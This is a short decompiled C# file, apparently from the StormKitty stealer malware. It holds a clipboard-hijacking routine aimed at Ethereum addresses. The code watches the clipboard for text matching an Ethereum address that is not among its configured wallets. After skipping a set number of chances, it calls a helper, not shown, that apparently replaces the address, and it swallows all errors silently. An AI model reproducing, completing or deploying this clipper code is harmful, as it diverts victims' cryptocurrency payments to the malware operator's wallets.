using System;
using System.Linq;
using System.Windows.Forms;

namespace StormKitty
{
	// Token: 0x02000044 RID: 68
	internal class Etherium
	{
		// Token: 0x0600011E RID: 286 RVA: 0x00009680 File Offset: 0x00007880
		public static void GetEtheriumWhile()
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					string text = Clipboard.GetText();
					if (!Config.walletseth.Contains(text) && CheckEth.Clipregex(text))
					{
						if (Etherium._oppToMiss > 0)
						{
							Etherium._oppToMiss--;
						}
						else
						{
							Etherium._oppToMiss = Config.OppToMissDef;
							CheckEth.SetsEtherium(text);
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000084 RID: 132
		public static int _oppToMiss;
	}
}
